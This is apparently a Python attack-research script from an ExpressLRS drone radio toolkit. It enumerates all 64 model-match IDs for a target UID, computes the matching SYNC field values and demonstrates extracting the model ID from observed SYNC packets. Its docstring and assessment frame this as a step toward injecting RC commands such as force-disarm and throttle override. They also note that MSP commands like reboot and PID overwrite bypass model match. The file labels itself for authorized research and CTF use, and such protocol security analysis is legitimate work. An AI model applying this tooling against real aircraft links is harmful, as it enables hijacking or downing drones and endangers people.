#!/usr/bin/env python3
"""
ELRS Model Match Brute-Force — enumerate all 64 model IDs

The ELRS v3 model match mechanism uses a 6-bit model ID (0-63) that must
match between TX and RX for RC channel data to be processed. This is NOT
a security mechanism — it's intended to prevent accidentally controlling
the wrong model in a multi-drone setup.

Attack premise:
  Model match is the final gate between ELRS connection and RC channel
  processing. Once an attacker has the UID (binding phrase cracked or
  brute-forced), CRC init, and FHSS sequence, they still need the
  correct model ID to inject RC channel data.

  With only 64 possible values and no rate limiting or lockout, the
  model ID is trivially brute-forceable:
    - At 150 Hz ELRS rate: 64 attempts / 150 Hz = 0.43 seconds
    - At 500 Hz ELRS rate: 64 attempts / 500 Hz = 0.13 seconds

  Model ID 0xFF (255) is special: it disables model match entirely.
  If the TX is configured with modelId=255, any model ID is accepted.

  The model ID is transmitted in SYNC packets (sent every FHSS cycle):
    - OTA v3: SYNC packet byte layout includes model ID
    - An attacker passively observing SYNC can extract the model ID
      directly, making brute-force unnecessary in most cases

  MSP-over-CRSF commands bypass model match entirely — they only need
  connection state, not model match. So this brute-force is specifically
  for RC channel injection (the more impactful attack for flight control).

Protocol details:
  - Model ID is 6 bits (0-63) in OTA v3 SYNC packets
  - UID[5] field in SYNC XORs the lower 6 bits with modelId
  - connectionHasModelMatch flag gates RC channel processing
  - MSP processing is gated by connectionState == CONNECTED only
    (model match not required for MSP in Betaflight 4.4.2)

Usage:
  # Show brute-force timing analysis
  python3 elrs-model-match-bruteforce.py --target 11:18:5b --analyze

  # Generate SYNC frames for all 64 model IDs
  python3 elrs-model-match-bruteforce.py --target 11:18:5b --enumerate

  # Demonstrate extraction from observed SYNC
  python3 elrs-model-match-bruteforce.py --target 11:18:5b --extract-demo

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import sys
import time

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# ELRS model match constants
# ---------------------------------------------------------------------------

MODEL_ID_BITS = 6
MODEL_ID_MAX = (1 << MODEL_ID_BITS) - 1  # 63
MODEL_ID_DISABLED = 0xFF  # modelId=255 disables match
UID5_MODELMATCH_MASK = 0x3F  # lower 6 bits

# ELRS rates and their packet intervals
ELRS_RATES = {
    "50Hz": {"interval_ms": 20.0, "description": "50 Hz (long range)"},
    "100Hz": {"interval_ms": 10.0, "description": "100 Hz"},
    "150Hz": {"interval_ms": 6.667, "description": "150 Hz (TinyHawk default)"},
    "200Hz": {"interval_ms": 5.0, "description": "200 Hz"},
    "250Hz": {"interval_ms": 4.0, "description": "250 Hz"},
    "333Hz": {"interval_ms": 3.0, "description": "333 Hz"},
    "500Hz": {"interval_ms": 2.0, "description": "500 Hz (racing)"},
}


def parse_target(target_str: str) -> bytes:
    parts = target_str.strip().upper().replace("-", ":").replace(" ", ":").split(":")
    if len(parts) != 3:
        raise ValueError("Target must be 3 bytes UID[3]:UID[4]:UID[5]")
    return bytes(int(p, 16) for p in parts)


def compute_sync_uid5(uid5: int, model_id: int) -> int:
    """Compute the transmitted UID5 field with model match XOR.

    In ELRS v3 SYNC packets, the lower 6 bits of the UID5 field are
    XORed with the model ID. With modelId=255, the XOR is with
    (255 & 0x3F) = 63, but the special handling means it's treated
    as "match any".
    """
    if model_id == MODEL_ID_DISABLED:
        return uid5  # no XOR when model match disabled
    return (uid5 & ~UID5_MODELMATCH_MASK) | ((uid5 ^ model_id) & UID5_MODELMATCH_MASK)


def extract_model_id(uid5_known: int, uid5_observed: int) -> int:
    """Extract model ID from observed SYNC UID5 vs known UID5."""
    return (uid5_known ^ uid5_observed) & UID5_MODELMATCH_MASK


def analyze_bruteforce():
    """Timing analysis for model ID brute-force."""
    total_ids = MODEL_ID_MAX + 1  # 64
    print(f"\nModel ID brute-force timing analysis:")
    print(f"  Total model IDs: {total_ids} (6-bit, 0-63)")
    print(f"  Average attempts to find correct ID: {total_ids / 2:.0f}")
    print(f"  Worst case attempts: {total_ids}")
    print()
    print(f"  {'Rate':>8s}  {'Interval':>10s}  {'Avg time':>10s}  {'Worst case':>12s}")
    print(f"  {'-'*8}  {'-'*10}  {'-'*10}  {'-'*12}")
    for rate_name, info in ELRS_RATES.items():
        interval = info["interval_ms"]
        avg_ms = (total_ids / 2) * interval
        worst_ms = total_ids * interval
        print(f"  {rate_name:>8s}  {interval:>8.1f}ms  {avg_ms:>8.0f}ms  {worst_ms:>10.0f}ms")

    print()
    print("  At the TinyHawk's 150 Hz rate:")
    print(f"    - Average: {32 * 6.667:.0f}ms ({32 * 6.667 / 1000:.2f}s)")
    print(f"    - Worst:   {64 * 6.667:.0f}ms ({64 * 6.667 / 1000:.2f}s)")
    print()
    print("  Model match is NOT a security boundary:")
    print("    - Only 64 possible values (6 bits)")
    print("    - No rate limiting or lockout on wrong model ID")
    print("    - Model ID visible in SYNC packets (passive extraction)")
    print("    - modelId=0xFF (255) disables model match entirely")
    print("    - MSP commands bypass model match altogether")


def enumerate_model_ids(target: bytes) -> list[dict]:
    """Generate all 64 model ID candidates with SYNC UID5 values."""
    uid3, uid4, uid5 = target
    candidates = []

    for model_id in range(MODEL_ID_MAX + 1):
        sync_uid5 = compute_sync_uid5(uid5, model_id)
        candidates.append({
            "model_id": model_id,
            "sync_uid5": sync_uid5,
            "sync_uid5_hex": f"0x{sync_uid5:02x}",
            "sync_bytes": f"{uid3:02x}:{uid4:02x}:{sync_uid5:02x}",
        })

    return candidates


def main():
    parser = argparse.ArgumentParser(
        description="ELRS Model Match Brute-Force — enumerate 64 model IDs"
    )
    parser.add_argument(
        "--target", required=True,
        help="Target UID[3]:UID[4]:UID[5] (hex, colon-separated)",
    )
    parser.add_argument(
        "--analyze", action="store_true",
        help="Show brute-force timing analysis for all ELRS rates",
    )
    parser.add_argument(
        "--enumerate", action="store_true",
        help="Generate all 64 model ID candidates with SYNC UID5 values",
    )
    parser.add_argument(
        "--extract-demo", action="store_true",
        help="Demonstrate model ID extraction from simulated SYNC",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
    )
    args = parser.parse_args()

    target = parse_target(args.target)
    uid3, uid4, uid5 = target
    target_hex = f"{uid3:02x}:{uid4:02x}:{uid5:02x}"

    print("ELRS Model Match Brute-Force")
    print(f"Target UID[3:5]: {target_hex}")
    print(f"UID[5] = 0x{uid5:02x} (lower 6 bits: 0x{uid5 & UID5_MODELMATCH_MASK:02x})")
    print(f"Model ID space: {MODEL_ID_MAX + 1} values (6-bit, 0-{MODEL_ID_MAX})")

    results = {
        "target": target_hex,
        "uid5": uid5,
        "model_id_space": MODEL_ID_MAX + 1,
    }

    if args.analyze:
        analyze_bruteforce()
        results["mode"] = "analyze"

    if args.enumerate:
        candidates = enumerate_model_ids(target)
        print(f"\n{'Model ID':>10s}  {'SYNC UID5':>10s}  {'SYNC bytes':>14s}")
        print(f"  {'-'*8}  {'-'*10}  {'-'*14}")
        for c in candidates:
            print(f"  {c['model_id']:>6d}    {c['sync_uid5_hex']:>8s}    {c['sync_bytes']:>14s}")
        results["candidates"] = candidates
        results["mode"] = "enumerate"

    if args.extract_demo:
        # Simulate: true model ID is 7
        true_model_id = 7
        sync_uid5 = compute_sync_uid5(uid5, true_model_id)
        extracted = extract_model_id(uid5, sync_uid5)

        print(f"\n{'=' * 60}")
        print("DEMO: Model ID extraction from SYNC packet")
        print(f"{'=' * 60}")
        print(f"  Known UID[5]:          0x{uid5:02x}")
        print(f"  True model ID:         {true_model_id}")
        print(f"  Observed SYNC UID[5]:  0x{sync_uid5:02x}")
        print(f"  Extracted model ID:    {extracted}")
        print(f"  Match: {extracted == true_model_id}")
        print()
        print(f"  The model ID is trivially extracted from any observed SYNC packet")
        print(f"  by XORing the known UID[5] with the observed UID[5] field (lower 6 bits).")
        print(f"  This makes passive extraction easier than brute-force in practice.")

        results["demo"] = {
            "true_model_id": true_model_id,
            "sync_uid5_observed": sync_uid5,
            "extracted_model_id": extracted,
            "match": extracted == true_model_id,
        }
        results["mode"] = "extract-demo"

    if not any([args.analyze, args.enumerate, args.extract_demo]):
        analyze_bruteforce()

    # Assessment
    print(f"\n{'=' * 60}")
    print("ASSESSMENT")
    print(f"{'=' * 60}")
    print("  Model match is a convenience feature, not a security mechanism.")
    print("  With 64 possible values and no lockout, brute-force takes <0.5s")
    print("  at typical ELRS rates. In practice, the model ID is directly")
    print("  observable in SYNC packets, making even brute-force unnecessary.")
    print()
    print("  Critically, MSP-over-CRSF commands do NOT require model match —")
    print("  they only need connectionState == CONNECTED. So the most dangerous")
    print("  attack commands (reboot, disarm, PID overwrite) bypass model match")
    print("  entirely. Model match only gates RC channel data processing.")
    print()
    print("  For RC channel injection specifically (the force-disarm and")
    print("  throttle-override scenarios), the 0.43s average brute-force")
    print("  time at 150 Hz is negligible in any attack timeline.")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
